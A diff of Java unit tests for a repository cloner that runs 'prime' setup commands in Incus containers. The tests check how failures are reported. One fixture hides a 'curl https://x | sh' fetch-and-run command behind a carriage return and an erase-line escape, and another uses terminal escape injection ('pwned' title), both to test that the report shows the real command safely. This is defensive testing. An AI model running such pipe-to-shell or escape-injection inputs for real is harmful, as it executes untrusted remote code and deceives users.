@@ -514,6 +514,110 @@ class RepoClonerTest {
                 "step output should contain the prime's captured stdout");
     }
 
+    @Test
+    void aFailedPrimeNamesItsStepAndCommand() {
+        // #1742: the summary and the failure report said "prepare", not which prime command failed.
+        var incus = mock(IncusClient.class);
+        var container = new Container(incus, "test");
+        primeAnswers(incus, OK, new IncusClient.ExecResult(1, "ERROR: JAVA_HOME is not set\nlocation of your Java installation.", ""));
+
+        var repo = repo("https://github.com/jbangdev/jbang", "~/jbang", null);
+        repo.setPrime(List.of("echo ready", "./gradlew dependencies"));
+        var imageDef = new ImageDef();
+        imageDef.setName("tpl-jbang");
+        imageDef.setRepos(List.of(repo));
+
+        var ex = assertThrows(IncusException.class,
+                () -> cloner(incus).cloneRepos(container, imageDef, java.util.Map.of(), MachineType.CONTAINER));
+        assertTrue(ex.getMessage().contains("jbang: prime `./gradlew dependencies` failed: location of your Java installation."),
+                ex.getMessage());
+        assertTrue(ex.stepOutput().contains("─── prime output: jbang ───\n$ ./gradlew dependencies\nERROR: JAVA_HOME"),
+                ex.stepOutput());
+        assertTrue(ex.stepOutput().contains("─── end prime output: jbang ───"), ex.stepOutput());
+    }
+
+    @Test
+    void aFailedPrimesCommandOutlastsTheReportsTrim() {
+        // The report keeps the last 100 lines of a prime's output, and the command above them.
+        var incus = mock(IncusClient.class);
+        var container = new Container(incus, "test");
+        var output = java.util.stream.IntStream.range(0, 150).mapToObj(i -> "line " + i)
+                .collect(java.util.stream.Collectors.joining("\n"));
+        primeAnswers(incus, new IncusClient.ExecResult(1, output, ""));
+
+        var imageDef = new ImageDef();
+        imageDef.setName("tpl-app");
+        imageDef.setRepos(List.of(repo("https://github.com/owner/app.git", "~/app", "npm install")));
+
+        var ex = assertThrows(IncusException.class,
+                () -> cloner(incus).cloneRepos(container, imageDef, java.util.Map.of(), MachineType.CONTAINER));
+        assertTrue(ex.stepOutput().contains("─── prime output: app ───\n$ npm install\nline 50\n"), ex.stepOutput());
+        assertFalse(ex.stepOutput().contains("line 49\n"), ex.stepOutput());
+    }
+
+    @Test
+    void aLongOrMultiLinePrimeIsShortenedOnTheFailureLineAndWholeInItsOutput() {
+        var incus = mock(IncusClient.class);
+        var container = new Container(incus, "test");
+        primeAnswers(incus, new IncusClient.ExecResult(1, "no such task", ""));
+
+        var imageDef = new ImageDef();
+        imageDef.setName("tpl-app");
+        imageDef.setRepos(List.of(repo("https://github.com/owner/app.git", "~/app",
+                "cd sub\n./gradlew --no-daemon dependencies --refresh-dependencies")));
+
+        var ex = assertThrows(IncusException.class,
+                () -> cloner(incus).cloneRepos(container, imageDef, java.util.Map.of(), MachineType.CONTAINER));
+        assertTrue(ex.getMessage().contains("app: prime `cd sub …` failed: no such task"), ex.getMessage());
+        assertTrue(ex.stepOutput().contains("$ cd sub\n> ./gradlew --no-daemon dependencies --refresh-dependencies\nno such task"),
+                ex.stepOutput());
+        assertEquals("./gradlew --no-daemon dependencies --re…",
+                RepoCloner.shortCommand("./gradlew --no-daemon dependencies --refresh-dependencies"));
+    }
+
+    @Test
+    void aCarriageReturnInAPrimeCannotHideTheCommandThatRan() {
+        // A terminal draws a carriage return's last frame alone: the command must not lose its start to one.
+        var incus = mock(IncusClient.class);
+        var container = new Container(incus, "test");
+        primeAnswers(incus, new IncusClient.ExecResult(1, "ERR", ""));
+
+        var imageDef = new ImageDef();
+        imageDef.setName("tpl-app");
+        imageDef.setRepos(List.of(repo("https://github.com/owner/app.git", "~/app", "curl https://x | sh\r\033[2Knpm install\t-q")));
+
+        var ex = assertThrows(IncusException.class,
+                () -> cloner(incus).cloneRepos(container, imageDef, java.util.Map.of(), MachineType.CONTAINER));
+        assertTrue(ex.getMessage().contains("app: prime `curl https://x | sh npm install -q` failed: ERR"), ex.getMessage());
+        assertTrue(ex.stepOutput().contains("$ curl https://x | sh npm install\t-q\nERR"), ex.stepOutput());
+    }
+
+    @Test
+    void aPrimeWhoseExecThrowsSaysItWasThePrime() {
+        var incus = mock(IncusClient.class);
+        var container = new Container(incus, "test");
+        primeAnswers(incus, OK);
+        when(incus.execInContainer(eq("test"), anyString(), anyString())).thenAnswer(invocation -> {
+            String script = invocation.getArgument(2);
+            if (script.startsWith("cd ")) throw new IllegalStateException();
+            return OK;
+        });
+
+        var imageDef = new ImageDef();
+        imageDef.setName("tpl-app");
+        imageDef.setRepos(List.of(repo("https://github.com/owner/app.git", "~/app", "npm install")));
+
+        var ex = assertThrows(IncusException.class,
+                () -> cloner(incus).cloneRepos(container, imageDef, java.util.Map.of(), MachineType.CONTAINER));
+        assertTrue(ex.getMessage().contains("app: prime failed: java.lang.IllegalStateException"), ex.getMessage());
+    }
+
+    @Test
+    void aShortenedCommandKeepsWholeCharacters() {
+        var command = "x".repeat(38) + "😀😀😀";
+        assertEquals("x".repeat(38) + "😀…", RepoCloner.shortCommand(command));
+    }
+
     private static final String PKIX = "Exception in thread \"main\" javax.net.ssl.SSLHandshakeException:"
             + " (certificate_unknown) PKIX path building failed: unable to find valid certification path";
 
@@ -696,7 +800,7 @@ class RepoClonerTest {
         var shown = output.toString(java.nio.charset.StandardCharsets.UTF_8);
         assertTrue(shown.contains("red"), shown);
         assertTrue(shown.contains("tail\tend"), "tabs are kept: " + shown);
-        assertTrue(shown.contains("for app: tail"), "the last line is on the failure line: " + shown);
+        assertTrue(shown.contains("for app: prime `exit 1` failed: tail"), "the last line is on the failure line: " + shown);
         assertEquals(TerminalLink.plainText(shown).replace("\033", "ESC"), shown.replace("\033", "ESC"),
                 "the prime's escapes must not reach the terminal");
         // The failure report a person is pointed to and may cat.
@@ -732,7 +836,7 @@ class RepoClonerTest {
             System.setErr(originalErr);
         }
         var shown = output.toString(java.nio.charset.StandardCharsets.UTF_8);
-        assertTrue(shown.contains("prepare output:  ]0;pwned  [2Japp"), shown);
+        assertTrue(shown.contains("prime output:  ]0;pwned  [2Japp"), shown);
         assertEquals(TerminalLink.plainText(shown).replace("\033", "ESC"), shown.replace("\033", "ESC"),
                 "the label's escapes must not reach the terminal");
         assertEquals(TerminalLink.plainText(ex.stepOutput()), ex.stepOutput());
